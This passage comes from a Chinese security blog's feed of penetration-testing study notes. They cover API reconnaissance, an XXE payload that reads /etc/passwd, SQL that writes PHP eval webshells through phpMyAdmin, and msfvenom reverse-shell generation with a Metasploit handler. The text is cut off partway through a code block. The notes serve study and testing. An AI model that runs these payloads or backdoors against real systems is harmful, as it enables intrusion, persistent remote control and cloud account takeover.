&lt;p&gt;项目位置：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dsb3hlYy9Dcm9zc0My&#34;&gt;https://github.com/gloxec/CrossC2&lt;/span&gt;&lt;br&gt;
 使用参考：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nbG94ZWMuZ2l0aHViLmlvL0Nyb3NzQzIvemhfY24v&#34;&gt;https://gloxec.github.io/CrossC2/zh_cn/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;目前版本只支持反向的 https 和正向的 tcp，下载对应版本加载器和 CNA 插件、上传加载器文件和本地加载 CNA 插件、修改 CNA 插件配置路径及上传 Key 文件、使用命令或插件绑定 HTTPS 监听器生成。&lt;/p&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/</id>
        <title>XD22 4 API 攻防</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/"/>
        <content type="html">&lt;h3 id=&#34;接口分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#接口分类&#34;&gt;#&lt;/a&gt; 接口分类&lt;/h3&gt;
&lt;p&gt;SOAP (Simple Object Access Protocol) 简单对象访问协议是交换数据的一 种协议规范，是一种轻量的、简单的、基于 XML (标准通用标记语言下的一个 子集) 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。SOAP 不是 Web Service 的专有协议。SOAP 使用 HTTP 来发送 XML 格式的数据，可以简单 理解为：SOAP = HTTP +XML。&lt;/p&gt;
&lt;p&gt;REST (Representational State Transfer) 即表述性状态传递，在三种主流的 Web 服务实现方案中，因为 REST 模式的 Web 服务与复杂的 SOAP 和 XML-RPC 对比来讲明显的更加简洁，越来越多的 Web 服务开始采用 REST 风格设计和实 现。例如，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0FtYXpvbi5jb20=&#34;&gt;Amazon.com&lt;/span&gt; 提供接近 REST 风格的 Web 服务进行图书查找；雅虎提 供的 Web 服务也是 REST 风格的。&lt;/p&gt;
&lt;p&gt;WSDL (Web Services Description Language) 即网络服务描述语言，用于描 述 Web 服务的公共接口。这是一个基于 XML 的关于如何与 Web 服务通讯和使 用的服务描述；也就是描述与目录中列出的 Web 服务进行交互时需要绑定的协 议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候 再将实际的网络协议和信息格式绑定给该服务。&lt;/p&gt;
&lt;p&gt;++ 注意 soap、rest、wsdl 属于 webservice 类&lt;/p&gt;
&lt;h4 id=&#34;webservice类-wsdl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#webservice类-wsdl&#34;&gt;#&lt;/a&gt; Webservice 类 wsdl&lt;/h4&gt;
&lt;p&gt;探针：?wsdl&lt;br&gt;
 搜索：inurl:aspx?wsdl、inurl:php?wsdl、&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2VkdS5jbg==&#34;&gt;edu.cn&lt;/span&gt; inurl:asmx?wsdl&lt;br&gt;
 利用：SoapUI 或者 ReadyAPI&lt;/p&gt;
&lt;p&gt;接口处有很多功能，每一个功能通过输入一些信息都会有相应的信息返回， 可以读取敏感信息泄漏，利用 SoapUI 和 ReadyAPI 通过获取到的 wsdl 接口即 xml 语言的页面自动发送 payload 测试有无安全漏洞。&lt;/p&gt;
&lt;p&gt;通过 ReadyAPI 测试接口需要一段时间，但是测试的比较全面，而且可以导 出报告，可以根据此报告查看此接口中含有哪些漏洞，如果跑出来 sql 注入可以 直接用 sqlmap 跑一下。&lt;/p&gt;
&lt;p&gt;常规网站全方位扫描工具只能发现这个地址，从这个地址的 url 地址加上参数测试，但是不会从这个地址显示出来的页面上测试漏洞，所有与常规的 web 测试不太相同，需要借助其他的工具。&lt;/p&gt;
&lt;h4 id=&#34;soap类-swagger&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#soap类-swagger&#34;&gt;#&lt;/a&gt; Soap 类 swagger&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;探针：可通过页面数据包或目录结构中查看有没有以下目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/swagger、/api/swagger、/swagger/ui、/api/swagger/ui&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/swagger-ui.html、/api/swagger-ui.html、/user/swagger-ui.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/libs/swaggerui、/api/swaggerui、/swagger-resources/configuration/ui&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/swagger-resources/configuration/security&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;工具一：可利用 SoapUI 导入 swagger 并解析此文件，SoapUI 工具测是使用 需要 swagger.json 的 url 地址，此地址包含其下的所有的页面中链接信息及配置 信息，但是此工具只能用来测试此接口是不是好的，不能测试到其安全问题。&lt;/p&gt;
&lt;p&gt;工具二:  &lt;code&gt;https://github.com/jayus0821/swagger-hack&lt;/code&gt; , 自动化爬取并自动测试 所有 swagger 接口，可使用 api-docs 或者 swagger.json 文件来测试，分析生成的 csv 查看有无敏感信息返回。一些接口处是可以获取到用户名和密码的，可以存 起来用来枚举此网站上的其他资源。&lt;/p&gt;
&lt;p&gt;手工：查看网站上每一个 swagger 所提供的接口的具体的功能，改变相应的 参数看能有什么效果，测试接口功能得到相应信息。&lt;/p&gt;
&lt;p&gt;其他工具:  &lt;code&gt;https://github.com/lijiejie/swagger-exp&lt;/code&gt; ，也可以再需要的时候去搜集工具。&lt;/p&gt;
&lt;h4 id=&#34;http类-webpack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http类-webpack&#34;&gt;#&lt;/a&gt; Http 类 Webpack&lt;/h4&gt;
&lt;p&gt;webpack 是代码编译工具，有入口、出口、loader 和插件。webpack 是一 个用于现代 JavaScript 应用程序的静态模块打包工具。当 webpack 处理应用程 序时，它会在内部构建一个依赖图 (dependency graph)，此依赖图对应映射到项 目所需的每个模块，并生成一个或多个 bundle&lt;/p&gt;
&lt;p&gt;探针：插件识别或者数据包中的 js 文件看有没有 webpack&lt;br&gt;
 工具：PackerFuzzer-&amp;gt; &lt;code&gt;https://github.com/rtcatc/Packer-Fuzzer&lt;/code&gt; &lt;br&gt;
Packer Fuzzer 是一种快速高效的扫描器，用于对由 javascript 模块捆绑器 (如 Webpack) 构建的网站进行安全检测。可以提取 js 中的代码，用来生成一 份报告，查看 js 中有没有相关的安全漏洞。&lt;/p&gt;
&lt;p&gt;在 WEB 前端打包打包，在渗透、安全服务中的网站是否会出现更多的 Webpack 打包器似调用，这也便于我们快速完成网站的和 API 清单，但发现这些 JS 打包器所生成的文件之多，并且代码异常量异常多的测试功能给我们提供 了很多上万行的手动功能带来了极大的不便，Packer Fuzzer 软件应运而生。&lt;/p&gt;
&lt;p&gt;自动模糊提取目标站点参数，以及对本内容的 API，以及对内容支持 API 的未授权访问：对内容支持的 API 进行 CORS、SQL 注入、越过、授权、任意文件上传大模糊高效在扫描，本工具还支持自动生成扫描报告，您可以选择方 便分析之后的 HTML 版本以及较正规的 doc、pdf、txt 版本。&lt;/p&gt;
&lt;h3 id=&#34;dvws鉴权-xxe利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dvws鉴权-xxe利用&#34;&gt;#&lt;/a&gt; DVWS 鉴权 XXE 利用&lt;/h3&gt;
&lt;h4 id=&#34;dvws-鉴权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dvws-鉴权&#34;&gt;#&lt;/a&gt; Dvws 鉴权&lt;/h4&gt;
&lt;p&gt;下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Nub29weXNlY3VyaXR5L2R2d3Mtbm9kZQ==&#34;&gt;https://github.com/snoopysecurity/dvws-node&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;抓取数据包进行测试，在页面中点击 admin 的时候会有一闪而过的情况， 分析处会判断当前的用户的 admin 字段是否是 true，如果不是不允许进入特定页 面。可以进行注册时的数据包修改，添加 admin 字段并设置为 true，再次进入特 定页面时发现越权成功。实际上也可以按照这个思路去测试一些鉴权问题是否 存在。&lt;/p&gt;
&lt;h4 id=&#34;dvws-xxe漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dvws-xxe漏洞&#34;&gt;#&lt;/a&gt; Dvws XXE 漏洞&lt;/h4&gt;
&lt;p&gt;利用 burp 的 http.history 模式，一顿前端上的接口操作之后，查看有没有特 殊的数据包。排查之后发现了一个如下 soap 的接口，并且是以 xml 语言进行传 输的，那么这种情况下就可以测试 xxe 漏洞，通过 file 协议读取敏感文件。但是 xxe 漏洞一般都是没有回显的，可以配合无回显利用加载远程 dtd 文件或者 dnslog 注入判断漏洞是否存在。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE Mikasa [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY test SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;soapenv:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soapenv=&amp;quot;http://schema&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.xmlsoap.org/soap/envelope/&amp;quot; xmlns:urn=&amp;quot;urn:examples:usernameservice&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;soapenv:Header/&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;soapenv:Body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;urn:Username soapenv:encodingStyle=&amp;quot;http://schemas.xmlsoap.org/soap/encoding/&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;username xsi:type=&amp;quot;xsd:string&amp;quot;&amp;gt;&amp;amp;test;&amp;lt;/username&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/urn:Username&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/soapenv:Body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/soapenv:Envelope&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;app-接口分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#app-接口分析&#34;&gt;#&lt;/a&gt; App 接口分析&lt;/h3&gt;
&lt;p&gt;用模拟器打开，流量代理到 burp，查看 app 上的按键及内容，翻阅 burp 的 历史请求，查看一些敏感的数据包。可以看到有大量的接口信息，并且得知网 站有 webpack，采用 PackFuzzer 进行网站 js 代码分析，在得到的文件中会展示 出所有的接口及影响程度。需要一个一个的寻找进行判断。发现所有与 admin 账户相关的数据包都不能正常访问，所以采用登录的方式访问，得到了更多信 息。继续分析 js 源码及 js 漏洞接口尝试获取更多信息。&lt;/p&gt;
&lt;p&gt;行云管家可以轻松管理云计算资源: &lt;code&gt;https://yun.cloudbility.com/login.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;阿里云 accesskey 利用: &lt;code&gt;https://github.com/mrknow001/aliyun-accesskey-Tools&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接口配置文件泄漏导致云资源主机受控，拿到 accesskey 之后就可以直接控制云上的所有资源&lt;/p&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
        <title>XD22 9 权限提升</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
        <content type="html">&lt;h3 id=&#34;webshell-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#webshell-提权&#34;&gt;#&lt;/a&gt; webshell 提权&lt;/h3&gt;
&lt;h4 id=&#34;phpmyadmin-突破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin-突破&#34;&gt;#&lt;/a&gt; phpmyadmin 突破&lt;/h4&gt;
&lt;p&gt;phpadmin 通过后台写 sql 拿 webshell&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示当前目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%datadir%&amp;#x27;;或 select @@basedir;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看数据库当前操作用户拥有写权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入后门&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php @eval($_POST[&amp;#x27;x&amp;#x27;]);?&amp;gt;&amp;#x27; INTO OUTFILE &amp;#x27;/var/lib/mysql/a.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启慢日志记录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set global slow_query_log=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置日志存储目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set global slow_query_log_file=&amp;#x27;/var/lib/www/blog.1.php&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入木马记录在日志&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php eval($_GET[A])?&amp;gt;&amp;#x27; or SLEEP(1);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;secure_file_priv 参数：NULL 不允许导入或导出、/tmp 只允许在 /tmp 目录导入导出、空则不限制目录&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt; root 高权限读文件：UNION SELECT 1,load_file (‘d:/w.txt’),3&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;root 高权限写文件：UNION SELECT 1,‘xxxx’,3 into outfile &#39;d:/www.txt’&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;win-web-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win-web-提权&#34;&gt;#&lt;/a&gt; win web 提权&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;信息收集&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;操作系统版本、漏洞补丁、系统位数、杀软防护、网络情况、当前权限等 信息。如 ver、systeminfo、whoami、netstat -ano、tasklist /svc 等。&lt;/p&gt;
&lt;p&gt;如果提权中无法执行命令，需要通过 web 权限上传 cmd.exej 进行执行，基 于补丁和系统版本位数来进行筛选可用溢出漏洞 EXP、手工操作、基于 CS 的 半自动化提权、基于 MSF 的全自动化提权。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;手工查找 CVE 与 EXP&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bG1vbi9WdWxtYXA=&#34;&gt;https://github.com/vulmon/Vulmap&lt;/span&gt; (不建议)&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpdHNhZG1pbi93ZXNuZw==&#34;&gt;https://github.com/bitsadmin/wesng&lt;/span&gt; (systeminfo&amp;gt; 1.txt, 之后用 wesng 去解析， 效果一般)&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Nocm9ibGVydC9XaW5kb3dzVnVsblNjYW4=&#34;&gt;https://github.com/chroblert/WindowsVulnScan&lt;/span&gt; (.\KBCollect.ps1 生成 KB.json 再去解析)&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4=&#34;&gt;https://i.hacking8.com/tiquan&lt;/span&gt; (将 systeminfo 的信息输入到此页面查找漏洞)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;工具辅助提权&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FzY290YmUvS2VybmVsSHVi&#34;&gt;https://github.com/Ascotbe/KernelHub&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL25vbWktc2VjL1BvQy1pbi1HaXRIdWI=&#34;&gt;https://github.com/nomi-sec/PoC-in-GitHub&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2s4Z2VnZS9MYWRvbg==&#34;&gt;https://github.com/k8gege/Ladon&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;工具提权不一定能成功，因为受作者测试环境与真实环境的不同，脚本难以完全一致，通常会选取 msf/cs 的自动化提权，毕竟经过了时间的考究。&lt;/p&gt;
&lt;h4 id=&#34;msf-全自动提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf-全自动提权&#34;&gt;#&lt;/a&gt; MSF 全自动提权&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成反弹后门&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=3333 -f exe -o msf.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom - a x86 --platform windows - p windows/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=4444 - b &amp;quot;\x00&amp;quot; - i 10 - f exe - o ~/Desktop/t.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;配置监听会话&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;筛选EXP模块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;background&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use post/windows/gather/enum_patches（半自动：根据漏洞编号找出系统中安装的补丁）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use post/multi/recon/local_exploit_suggester（全自动：快速识别系统中可能被利用的漏洞）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set session 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set showdescription true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta 